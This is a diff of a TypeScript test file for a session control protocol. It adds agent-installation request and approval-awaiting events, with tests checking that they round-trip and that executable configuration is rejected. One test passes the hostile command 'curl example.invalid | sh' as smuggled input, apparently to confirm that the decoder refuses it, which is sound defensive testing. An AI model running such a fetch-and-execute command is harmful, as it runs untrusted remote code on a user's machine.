@@ -2,9 +2,15 @@ import { describe, expect, it } from "vitest";
 
 import {
   AGENT_CONTENT_KIND,
+  AGENT_INSTALL_AWAITING_APPROVAL_KIND,
+  AGENT_INSTALL_REQUEST_KIND,
   type AgentContentEvent,
   type AgentDisplayContent,
+  type AgentInstallAwaitingApprovalEvent,
+  type AgentInstallRequestCommand,
   decodeAgentContentEvent,
+  decodeAgentInstallAwaitingApprovalEvent,
+  decodeAgentInstallRequestCommand,
   decodeSessionConfigureCommand,
   decodeSessionElicitationRequestedEvent,
   decodeSessionPermissionRequestedEvent,
@@ -13,6 +19,8 @@ import {
   decodeSessionUsageUpdatedEvent,
   decodeWorkspaceListCommand,
   encodeAgentContentEvent,
+  encodeAgentInstallAwaitingApprovalEvent,
+  encodeAgentInstallRequestCommand,
   encodeSessionConfigureCommand,
   encodeSessionElicitationRequestedEvent,
   encodeSessionPermissionRequestedEvent,
@@ -59,6 +67,46 @@ const modelOption: SessionConfigOption = {
 };
 
 describe("ACP session control protocol", () => {
+  it("Given a missing registered Agent, When Web requests installation, Then only its request and Agent identifiers cross the boundary", () => {
+    const command: AgentInstallRequestCommand = {
+      agentId: "codex",
+      kind: AGENT_INSTALL_REQUEST_KIND,
+      protocolVersion: MOBIUS_PROTOCOL_VERSION,
+      requestId: "install-1",
+    };
+    const awaitingApproval: AgentInstallAwaitingApprovalEvent = {
+      agentId: "codex",
+      kind: AGENT_INSTALL_AWAITING_APPROVAL_KIND,
+      protocolVersion: MOBIUS_PROTOCOL_VERSION,
+      requestId: "install-1",
+    };
+
+    expect(
+      decodeAgentInstallRequestCommand(
+        encodeAgentInstallRequestCommand(command),
+      ),
+    ).toEqual(command);
+    expect(
+      decodeAgentInstallAwaitingApprovalEvent(
+        encodeAgentInstallAwaitingApprovalEvent(awaitingApproval),
+      ),
+    ).toEqual(awaitingApproval);
+  });
+
+  it("Given an installation request contains executable configuration, When the local boundary decodes it, Then the request is rejected before recipe resolution", () => {
+    expect(() =>
+      decodeAgentInstallRequestCommand(
+        JSON.stringify({
+          agentId: "codex",
+          command: "curl example.invalid | sh",
+          kind: AGENT_INSTALL_REQUEST_KIND,
+          protocolVersion: MOBIUS_PROTOCOL_VERSION,
+          requestId: "install-1",
+        }),
+      ),
+    ).toThrowError(ProtocolMessageError);
+  });
+
   it("Given an authorized directory handle, When a session is prepared, Then capabilities and dynamic configuration round-trip", () => {
     const command: SessionPrepareCommand = {
       additionalDirectoryIds: [],
